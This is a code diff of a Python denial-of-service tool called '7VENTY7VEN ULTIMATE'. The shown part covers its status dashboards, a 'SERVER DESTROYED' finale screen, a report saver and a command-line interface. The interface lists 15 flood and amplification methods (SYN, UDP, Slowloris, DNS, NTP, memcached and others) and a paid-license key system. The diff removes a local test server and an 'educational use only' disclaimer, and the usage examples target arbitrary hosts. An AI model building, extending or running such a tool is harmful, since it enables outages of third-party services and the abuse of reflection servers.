+        """Display status"""
+        try:
+            while self.running:
+                stats = self.tracker.get_stats()
+                
+                # Clear screen
+                os.system('clear' if os.name == 'posix' else 'cls')
+                
+                # Get Slowloris count
+                slowloris_count = 0
+                if 'SLOWLORIS' in self.attacks:
+                    slowloris_count = self.attacks['SLOWLORIS'].get_count()
+                
+                # Header
+                print(f"""
+{Colors.RED}╔═══════════════════════════════════════════════════════════════════╗
+║                    📊 LIVE ATTACK STATUS - 15 METHODS            ║
+╠═══════════════════════════════════════════════════════════════════╣
+║                                                                   ║
+║  🎯 TOTAL HITS: {stats['total']:<8}  ⚡ RATE: {stats['rate']:.1f}/s                     ║
+║  🐌 SLOWLORIS: {slowloris_count:<4} connections                              ║
+║  ⏱️  ELAPSED: {int(stats['elapsed']//60)}m {int(stats['elapsed']%60)}s                                   ║
+║                                                                   ║
+╠═══════════════════════════════════════════════════════════════════╣
+║                    📋 HIT BREAKDOWN                               ║
+╠═══════════════════════════════════════════════════════════════════╣
+║                                                                   ║""")
+                
+                # Show all 15 methods
+                all_methods = ['HTTP', 'HTTPS', 'UDP', 'TCP_SYN', 'TCP_ACK', 'DNS', 'NTP', 
+                              'SLOWLORIS', 'ICMP', 'MEMCACHED', 'SSDP', 'SNMP', 
+                              'WEBSOCKET', 'RST', 'CHARGEN']
+                
+                for method in all_methods:
+                    count = stats['by_method'].get(method, 0)
+                    if count > 0 or method in self.attacks:
+                        bar = '█' * min(20, int(count / max(1, stats['total']) * 20)) if stats['total'] > 0 else ''
+                        print(f"║  {method:<10}: {count:>6} hits [{bar:<20}]          ║")
+                
+                print(f"""
+╠═══════════════════════════════════════════════════════════════════╣
+║                    📋 LAST 8 HITS                                 ║
+╠═══════════════════════════════════════════════════════════════════╣""")
+                
+                for hit in stats['last']:
+                    print(f"║  [{hit['time']}] {hit['method']:<8} → {hit['target']}:{hit['port']:<5}     ║")
+                
+                print(f"""
+╠═══════════════════════════════════════════════════════════════════╣
+║                    🔑 LICENSE INFO                                ║
+╠═══════════════════════════════════════════════════════════════════╣
+║  Type: {self.license.type.value.upper():<15}                                   ║
+║  Expires: {self.license.expiry.strftime('%Y-%m-%d') if self.license.expiry else 'Never'}              ║
+║  Root: {'YES' if self.license.is_root else 'NO'} - {'All methods' if self.license.is_root else '10 methods require root'}   ║
+║                                                                   ║
+╚═══════════════════════════════════════════════════════════════════╝{Colors.END}
+                """)
                 
                 time.sleep(0.5)
                 
-            except Exception as e:
-                time.sleep(1)
-    
-    def print_infinite_status(self, elapsed, total, rate, errors, bw_rate, hits, hit_rate, slowloris_active=0):
-        """Status display for infinite mode"""
-        
-        # Format time
-        minutes = int(elapsed // 60)
-        seconds = int(elapsed % 60)
-        time_str = f"{minutes:02d}:{seconds:02d}"
-        
-        # Progress to death
-        death_progress = min(100, (self.consecutive_errors / self.death_error_threshold) * 100)
-        death_bar = '█' * int(death_progress/4) + '░' * (25 - int(death_progress/4))
-        
-        # Format bandwidth
-        if bw_rate > 1024 * 1024:
-            bw_str = f"{bw_rate/(1024*1024):.2f} MB/s"
-        elif bw_rate > 1024:
-            bw_str = f"{bw_rate/1024:.2f} KB/s"
-        else:
-            bw_str = f"{bw_rate:.2f} B/s"
-        
-        status = f"""
-{Colors.RED}╔═══════════════════════════════════════════════════════════════════╗{Colors.END}
-{Colors.RED}║{Colors.YELLOW}              ⚡ INFINITE DEATH MISSION ACTIVE ⚡                {Colors.RED}║{Colors.END}
-{Colors.RED}╠═══════════════════════════════════════════════════════════════════╣{Colors.END}
-{Colors.RED}║{Colors.GREEN}                                                                   {Colors.RED}║{Colors.END}
-{Colors.RED}║{Colors.GREEN}  🎯 TOTAL HITS: {hits:<8} | HIT RATE: {hit_rate:.1f}/s                 {Colors.RED}║{Colors.END}
-{Colors.RED}║{Colors.GREEN}  🐌 SLOWLORIS ACTIVE: {slowloris_active:<4} connections                    {Colors.RED}║{Colors.END}
-{Colors.RED}║{Colors.GREEN}  💀 DEATH PROGRESS: [{death_bar}] {death_progress:.1f}%                     {Colors.RED}║{Colors.END}
-{Colors.RED}║{Colors.GREEN}  ⚠️  CONSECUTIVE ERRORS: {self.consecutive_errors}/{self.death_error_threshold}                    {Colors.RED}║{Colors.END}
-{Colors.RED}║{Colors.GREEN}                                                                   {Colors.RED}║{Colors.END}
-{Colors.RED}║{Colors.CYAN}  🌐 HTTP: {self.stats.get('HTTP',0):<6} | 🔒 HTTPS: {self.stats.get('HTTPS',0):<6} | 💧 UDP: {self.stats.get('UDP',0):<6} {Colors.RED}║{Colors.END}
-{Colors.RED}║{Colors.CYAN}  🐌 SLOWLORIS: {self.stats.get('SLOWLORIS',0):<6}                          {Colors.RED}║{Colors.END}
-{Colors.RED}╠═══════════════════════════════════════════════════════════════════╣{Colors.END}
-{Colors.RED}║{Colors.MAGENTA}                                                                   {Colors.RED}║{Colors.END}
-{Colors.RED}║{Colors.MAGENTA}  📊 TOTAL: {total:>8} packets  |  ⚡ RATE: {rate:>7.1f}/s           {Colors.RED}║{Colors.END}
-{Colors.RED}║{Colors.MAGENTA}  💾 BANDWIDTH: {bw_str:<15} |  ❌ ERRORS: {errors:<5}           {Colors.RED}║{Colors.END}
-{Colors.RED}║{Colors.MAGENTA}  ⏱️  ELAPSED: {time_str:<8}     |  💀 STATUS: {'FIGHTING' if not self.death_detected else 'DEAD'}    {Colors.RED}║{Colors.END}
-{Colors.RED}║{Colors.MAGENTA}                                                                   {Colors.RED}║{Colors.END}
-{Colors.RED}╚═══════════════════════════════════════════════════════════════════╝{Colors.END}
-
-{Colors.YELLOW}📋 Last 5 Hits:{Colors.END}
-"""
-        
-        # Show last 5 hits
-        for hit in self.hit_tracker.hits[-5:]:
-            ip_part = hit['target'].replace('.', '[.]')
-            status += f"{Colors.CYAN}  [{hit['time_str']}] #{hit['id']} → {ip_part}[:{hit['port']}] ({hit['attack_type']}){Colors.END}\n"
-        
-        print(status)
-    
-    def print_infinite_banner(self, target, cfg, intensity, methods):
-        """Print infinite mode banner"""
-        banner = f"""
-{Colors.RED}╔═══════════════════════════════════════════════════════════════════╗{Colors.END}
-{Colors.RED}║{Colors.WHITE}                                                                   {Colors.RED}║{Colors.END}
-{Colors.RED}║{Colors.WHITE}   ██╗███╗   ██╗███████╗██╗███╗   ██╗██╗████████╗███████╗   {Colors.RED}║{Colors.END}
-{Colors.RED}║{Colors.WHITE}   ██║████╗  ██║██╔════╝██║████╗  ██║██║╚══██╔══╝██╔════╝   {Colors.RED}║{Colors.END}
-{Colors.RED}║{Colors.WHITE}   ██║██╔██╗ ██║█████╗  ██║██╔██╗ ██║██║   ██║   █████╗     {Colors.RED}║{Colors.END}
-{Colors.RED}║{Colors.WHITE}   ██║██║╚██╗██║██╔══╝  ██║██║╚██╗██║██║   ██║   ██╔══╝     {Colors.RED}║{Colors.END}
-{Colors.RED}║{Colors.WHITE}   ██║██║ ╚████║██║     ██║██║ ╚████║██║   ██║   ███████╗   {Colors.RED}║{Colors.END}
-{Colors.RED}║{Colors.WHITE}   ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝   ╚═╝   ╚══════╝   {Colors.RED}║{Colors.END}
-{Colors.RED}║{Colors.WHITE}                                                                   {Colors.RED}║{Colors.END}
-{Colors.RED}╠═══════════════════════════════════════════════════════════════════╣{Colors.END}
-{Colors.RED}║{Colors.CYAN}                                                                   {Colors.RED}║{Colors.END}
-{Colors.RED}║{Colors.CYAN}  🎯 TARGET: {target:<50}  {Colors.RED}║{Colors.END}
-{Colors.RED}║{Colors.CYAN}  🔥 INTENSITY: {intensity.upper():<10} (INFINITE MODE)               {Colors.RED}║{Colors.END}
-{Colors.RED}║{Colors.CYAN}  ⚡ THREADS: {cfg['threads']*cfg['multiplier']:.0f} per method                      {Colors.RED}║{Colors.END}
-{Colors.RED}║{Colors.CYAN}  ⏱️  DURATION: UNTIL DEATH                                {Colors.RED}║{Colors.END}
-{Colors.RED}║{Colors.CYAN}  🛠️  METHODS: {len(methods)} active attacks                           {Colors.RED}║{Colors.END}
-{Colors.RED}║{Colors.GREEN}                                                                   {Colors.RED}║{Colors.END}
-{Colors.RED}║{Colors.GREEN}  🔥 CREATED BY: 7VENTY7VEN                                       {Colors.RED}║{Colors.END}
-{Colors.RED}║{Colors.GREEN}  ⚡ VERSION: ULTIMATE v14.0 - FIXED SLOWLORIS                     {Colors.RED}║{Colors.END}
-{Colors.RED}║{Colors.GREEN}  🐌 SLOWLORIS NOW WORKING!                                        {Colors.RED}║{Colors.END}
-{Colors.RED}║{Colors.GREEN}                                                                   {Colors.RED}║{Colors.END}
-{Colors.RED}╚═══════════════════════════════════════════════════════════════════╝{Colors.END}
-"""
-        print(banner)
-    
-    def print_death_finale(self):
-        """Print death finale"""
-        elapsed = time.time() - self.start_time
-        minutes = int(elapsed // 60)
-        seconds = int(elapsed % 60)
-        
-        finale = f"""
-{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════════╗
-║                                                                   ║
-║                 💀💀💀 VICTORY! SERVER IS DEAD 💀💀💀                 ║
-║                                                                   ║
-╠═══════════════════════════════════════════════════════════════════╣
-║                                                                   ║
-║  🎯 FINAL HITS:        {self.hit_tracker.hit_count:<8}                              ║
-║  ⏱️  TIME TO DEATH:    {minutes}m {seconds}s                                      ║
-║  ⚡ AVERAGE HIT RATE:  {self.hit_tracker.hit_count/elapsed:.1f}/s                                 ║
-║  🐌 SLOWLORIS HITS:    {self.stats.get('SLOWLORIS',0):<8}                              ║
-║  📦 TOTAL PACKETS:     {self.stats['total']:<8}                              ║
-║  ❌ TOTAL ERRORS:      {self.stats['errors']:<8}                              ║
-║                                                                   ║
-╠═══════════════════════════════════════════════════════════════════╣
-║                    📊 FINAL HIT BREAKDOWN                        ║
-╠═══════════════════════════════════════════════════════════════════╣
-"""
-        
-        # Add hit breakdown
-        hit_summary = self.hit_tracker.get_summary()
-        for method, count in hit_summary.items():
-            percentage = (count / self.hit_tracker.hit_count * 100) if self.hit_tracker.hit_count > 0 else 0
-            bar = '█' * int(percentage / 5) + '░' * (20 - int(percentage / 5))
-            finale += f"║  {method:<12}: {count:>6} hits [{bar}] {percentage:>5.1f}%      ║\n"
-        
-        finale += f"""
-╠═══════════════════════════════════════════════════════════════════╣
-║                    📋 LAST 10 HITS                               ║
-╠═══════════════════════════════════════════════════════════════════╣
-"""
-        
-        # Show last 10 hits
-        for hit in self.hit_tracker.hits[-10:]:
-            ip_part = hit['target'].replace('.', '[.]')
-            finale += f"║  [{hit['time_str']}] #{hit['id']} → {ip_part}[:{hit['port']}] ({hit['attack_type']})║\n"
-        
-        finale += f"""
-╠═══════════════════════════════════════════════════════════════════╣
-║                                                                   ║
-║  🔥 MISSION COMPLETE - SERVER DESTROYED! 🔥                       ║
-║  ⚡ 7VENTY7VEN'S ULTIMATE TOOL - FIXED SLOWLORIS ⚡                ║
-║                                                                   ║
-╚═══════════════════════════════════════════════════════════════════╝{Colors.END}
-"""
-        print(finale)
-
-# ==================== TEST SERVER ====================
-class TestServer:
-    """Simple test server that can be killed"""
-    
-    def __init__(self, port=8080):
-        self.port = port
-        self.running = False
-        self.server = None
-        self.hit_count = 0
-        self.start_time = None
-        
-    def start(self):
-        """Start the test server"""
-        self.running = True
-        self.start_time = time.time()
-        
-        def handle_client(client_socket, address):
-            """Handle client connection"""
-            self.hit_count += 1
-            try:
-                request = client_socket.recv(1024).decode()
-                
-                # Simple response
-                response = f"""HTTP/1.1 200 OK
-Content-Type: text/html
-Server: TestServer/1.0
-Hit-Count: {self.hit_count}
-
-<html>
-<head><title>Test Server</title></head>
-<body>
-<h1>Test Server Running!</h1>
-<p>Hits: {self.hit_count}</p>
-<p>Uptime: {int(time.time() - self.start_time)} seconds</p>
-<p>Your IP: {address[0]}</p>
-</body>
-</html>
-"""
-                client_socket.send(response.encode())
-            except:
-                pass
-            finally:
-                client_socket.close()
-        
-        def run_server():
-            """Run the server"""
-            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            self.server.bind(('0.0.0.0', self.port))
-            self.server.listen(100)
-            
-            print(f"{Colors.GREEN}[+] Test server started on port {self.port}{Colors.END}")
-            print(f"{Colors.GREEN}[+] Hit it with: python3 1.py -t http://localhost:{self.port}/ -i ultimate -m SLOWLORIS{Colors.END}")
-            print(f"{Colors.YELLOW}[!] Press Ctrl+C to stop server{Colors.END}")
-            
-            while self.running:
-                try:
-                    client, address = self.server.accept()
-                    thread = threading.Thread(target=handle_client, args=(client, address))
-                    thread.daemon = True
-                    thread.start()
-                except:
-                    break
-        
-        thread = threading.Thread(target=run_server)
-        thread.daemon = True
-        thread.start()
-        return thread
+        except KeyboardInterrupt:
+            self.stop()
     
     def stop(self):
-        """Stop the test server"""
+        """Stop all attacks"""
+        print(f"\n{Colors.YELLOW}🛑 Stopping all attacks...{Colors.END}")
         self.running = False
-        if self.server:
-            self.server.close()
-        print(f"{Colors.RED}[!] Test server stopped. Total hits: {self.hit_count}{Colors.END}")
+        
+        for name, attack in self.attacks.items():
+            attack.stop()
+        
+        # Final stats
+        stats = self.tracker.get_stats()
+        
+        print(f"""
+{Colors.GREEN}╔═══════════════════════════════════════════════════════════════════╗
+║                    🏁 FINAL STATISTICS - ALL 15 METHODS         ║
+╠═══════════════════════════════════════════════════════════════════╣
+║                                                                   ║
+║  🎯 TOTAL HITS: {stats['total']:<8}                                      ║
+║  ⚡ AVG RATE: {stats['total']/max(1, stats['elapsed']):.1f}/s                       ║
+║  ⏱️  DURATION: {int(stats['elapsed']//60)}m {int(stats['elapsed']%60)}s                                  ║
+║                                                                   ║
+╠═══════════════════════════════════════════════════════════════════╣
+║                    📊 FINAL BREAKDOWN                             ║
+╠═══════════════════════════════════════════════════════════════════╣
+║                                                                   ║""")
+        
+        for method, count in sorted(stats['by_method'].items(), key=lambda x: x[1], reverse=True):
+            percentage = (count / stats['total'] * 100) if stats['total'] > 0 else 0
+            bar = '█' * int(percentage / 5)
+            print(f"║  {method:<10}: {count:>6} hits ({percentage:>5.1f}%) [{bar:<20}]║")
+        
+        print(f"""
+║                                                                   ║
+╚═══════════════════════════════════════════════════════════════════╝{Colors.END}
+        """)
+        
+        # Save report
+        self.save_report(stats)
+    
+    def save_report(self, stats):
+        """Save report"""
+        report = {
+            'timestamp': datetime.datetime.now().isoformat(),
+            'license': self.license.type.value,
+            'hardware_id': self.license.hardware_id,
+            'stats': {
+                'total_hits': stats['total'],
+                'duration': stats['elapsed'],
+                'average_rate': stats['total'] / max(1, stats['elapsed']),
+                'by_method': stats['by_method']
+            },
+            'methods_used': list(self.attacks.keys())
+        }
+        
+        filename = f"report_{int(time.time())}.json"
+        try:
+            with open(filename, 'w') as f:
+                json.dump(report, f, indent=2)
+            print(f"{Colors.GREEN}📁 Report saved to {filename}{Colors.END}")
+        except:
+            pass
 
-# ==================== MAIN EXECUTION ====================
+# ==================== MAIN ====================
+
 def main():
-    """Perfect main function"""
+    """Main entry point"""
+    import argparse
     
-    def signal_handler(sig, frame):
-        print(f"\n{Colors.YELLOW}[!] Received interrupt signal{Colors.END}")
-        if 'hammer' in globals():
-            hammer.running = False
-            hammer.cleanup()
-        if 'test_server' in globals() and test_server:
-            test_server.stop()
-        sys.exit(0)
-    
-    signal.signal(signal.SIGINT, signal_handler)
-    signal.signal(signal.SIGTERM, signal_handler)
-    
-    parser = argparse.ArgumentParser(description='7VENTY7VEN Ultimate Tool v14.0', add_help=False)
-    parser.add_argument('-t', '--target', help='Target URL (e.g., http://example.com)')
-    parser.add_argument('-i', '--intensity', default='ultimate', 
-                       choices=['low', 'medium', 'high', 'seven', 'ultimate'],
-                       help='Attack intensity (default: ultimate)')
-    parser.add_argument('-m', '--methods', nargs='+',
-                       choices=[m.name for m in AttackMethod],
-                       help='Specific attack methods to use')
-    parser.add_argument('--list-methods', action='store_true', help='List all available attack methods')
-    parser.add_argument('--save-hits', action='store_true', help='Save hit log to JSON file')
-    parser.add_argument('--start-server', action='store_true', help='Start a test server')
-    parser.add_argument('--server-port', type=int, default=8080, help='Test server port (default: 8080)')
-    parser.add_argument('-h', '--help', action='store_true', help='Show help')
+    parser = argparse.ArgumentParser(description='7VENTY7VEN ULTIMATE - ALL 15 METHODS')
+    parser.add_argument('-t', '--target', help='Target URL/IP')
+    parser.add_argument('-m', '--methods', nargs='+', 
+                       choices=['HTTP', 'HTTPS', 'UDP', 'TCP_SYN', 'TCP_ACK', 'DNS', 'NTP',
+                               'SLOWLORIS', 'ICMP', 'MEMCACHED', 'SSDP', 'SNMP',
+                               'WEBSOCKET', 'RST', 'CHARGEN', 'ALL'],
+                       help='Attack methods (use ALL for everything)')
+    parser.add_argument('-i', '--intensity', default='medium',
+                       choices=['low', 'medium', 'high', 'extreme', 'insane', 'ultimate'],
+                       help='Attack intensity')
+    parser.add_argument('--list', action='store_true', help='List all methods')
+    parser.add_argument('--license', action='store_true', help='Show license')
+    parser.add_argument('--activate', action='store_true', help='Activate license')
+    parser.add_argument('--generate-key', help='Generate license key (admin)')
     
     args = parser.parse_args()
     
-    if args.start_server:
-        global test_server
-        test_server = TestServer(port=args.server_port)
-        test_server.start()
-        try:
-            while True:
-                time.sleep(1)
-        except KeyboardInterrupt:
-            test_server.stop()
-        return
-    
-    if args.list_methods:
-        print(f"\n{Colors.CYAN}Available Attack Methods:{Colors.END}\n")
-        for method in AttackMethod:
-            config = method.value
-            root_req = "🔴 Requires Root" if config.requires_root else "✅ No Root Required"
-            print(f"{Colors.GREEN}• {method.name:<12}{Colors.END} - {config.description:<30} {Colors.YELLOW}[{root_req}]{Colors.END}")
-        print()
-        return
-    
-    if args.help or not args.target:
+    if args.list:
         print(f"""
-{Colors.CYAN}7VENTY7VEN'S ULTIMATE STRESS TESTER v14.0 - FIXED SLOWLORIS{Colors.END}
-{Colors.PINK}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.END}
+{Colors.CYAN}Available Attack Methods (15 total):{Colors.END}
 
-{Colors.GREEN}USAGE:{Colors.END}
-  python3 1.py -t <target> -i <intensity> [options]
-  python3 1.py --start-server              (Start test server)
+{Colors.GREEN}Layer 7 (Application):{Colors.END}
+  🌐 HTTP         - Standard HTTP flood
+  🔒 HTTPS        - Encrypted HTTPS flood
+  🐌 SLOWLORIS    - Slow HTTP headers attack
+  🔌 WEBSOCKET    - WebSocket connections flood
 
-{Colors.YELLOW}TARGET EXAMPLES:{Colors.END}
-  http://localhost:8080/     (Local test server)
-  http://example.com         (Web server)
-  https://example.com        (HTTPS server)
+{Colors.YELLOW}Layer 4 (Transport):{Colors.END}
+  💧 UDP          - Raw UDP flood
+  📡 TCP_SYN      - SYN flood (requires root)
+  📨 TCP_ACK      - ACK flood (requires root)
+  💥 RST          - TCP RST flood (requires root)
 
-{Colors.MAGENTA}INFINITE MODE:{Colors.END}
-  Runs FOREVER until the server dies!
-  Automatic death detection at 10 consecutive errors
+{Colors.RED}Amplification (Reflection):{Colors.END}
+  🌍 DNS          - DNS amplification (requires root)
+  ⏰ NTP          - NTP monlist amplification (requires root)
+  💾 MEMCACHED    - Memcached amplification (requires root)
+  📺 SSDP         - SSDP reflection (requires root)
+  🔧 SNMP         - SNMP reflection (requires root)
+  ⚡ CHARGEN      - Chargen amplification (requires root)
 
-{Colors.CYAN}OPTIONS:{Colors.END}
-  -t, --target TARGET     Target URL
-  -i, --intensity         Attack intensity (low/medium/high/seven/ultimate)
-  -m METHOD1 METHOD2 ...  Specific attack methods
-  --list-methods         List all available methods
-  --save-hits            Save hit log to JSON file
-  --start-server         Start a test server
-  --server-port PORT     Test server port (default: 8080)
-  -h, --help             Show this help
+{Colors.BLUE}Other:{Colors.END}
+  📶 ICMP         - Ping flood (requires root)
 
-{Colors.PURPLE}EXAMPLES:{Colors.END}
-  # Start a test server
-  python3 1.py --start-server
-  
-  # Attack with Slowloris only (NOW FIXED!)
-  python3 1.py -t http://localhost:8080/ -i ultimate -m SLOWLORIS
-  
-  # Attack with all methods
-  python3 1.py -t http://localhost:8080/ -i ultimate
-
-{Colors.RED}🐌 SLOWLORIS IS NOW FIXED!{Colors.END}
-  • Maintains hundreds of connections
-  • Sends headers every 10 seconds
-  • Shows active connection count
-  • Works perfectly with test server
-
-{Colors.RED}⚠️  EDUCATIONAL USE ONLY - TEST YOUR OWN SERVERS{Colors.END}
+{Colors.MAGENTA}Usage Examples:{Colors.END}
+  python3 ultimate.py -t http://example.com -m ALL -i ultimate
+  python3 ultimate.py -t http://example.com -m SLOWLORIS HTTP HTTPS -i high
+  python3 ultimate.py -t 192.168.1.1 -m UDP TCP_SYN -i extreme --root
         """)
         return
     
-    # Fix target
-    if not args.target.startswith(('http://', 'https://')):
-        args.target = f"http://{args.target}"
+    if args.license:
+        lm = LicenseManager()
+        print(f"""
+License Information:
+  Type: {lm.type.value if hasattr(lm, 'type') else 'None'}
+  Valid: {lm.is_valid if hasattr(lm, 'is_valid') else False}
+  Hardware ID: {lm.hardware_id}
+  Expires: {lm.expiry.strftime('%Y-%m-%d') if hasattr(lm, 'expiry') and lm.expiry else 'N/A'}
+  Root Access: {'YES' if lm.is_root else 'NO'}
+        """)
+        return
     
-    # Create and run
-    global hammer
+    if args.activate:
+        LicenseManager()
+        return
+    
+    if args.generate_key:
+        lm = LicenseManager()
+        key = lm.generate_license(LicenseType.ENTERPRISE, 365)
+        print(f"Generated License Key:\n{key}")
+        return
+    
+    if not args.target:
+        parser.print_help()
+        return
+    
+    # Convert ALL to all methods
+    if args.methods and 'ALL' in args.methods:
+        args.methods = ['HTTP', 'HTTPS', 'UDP', 'TCP_SYN', 'TCP_ACK', 'DNS', 'NTP',
+                       'SLOWLORIS', 'ICMP', 'MEMCACHED', 'SSDP', 'SNMP',
+                       'WEBSOCKET', 'RST', 'CHARGEN']
+    
+    # Start hammer
     hammer = UltimateHammer()
     
     try:
-        hammer.infinite_combo(args.target, args.intensity, args.methods)
-    except Exception as e:
-        hammer.error_handler.log(ErrorLevel.CRITICAL, f"Unexpected error: {e}")
-    finally:
-        hammer.cleanup()
+        hammer.start(args.target, args.methods, args.intensity)
+        while hammer.running:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        hammer.stop()
 
 if __name__ == "__main__":
     main()
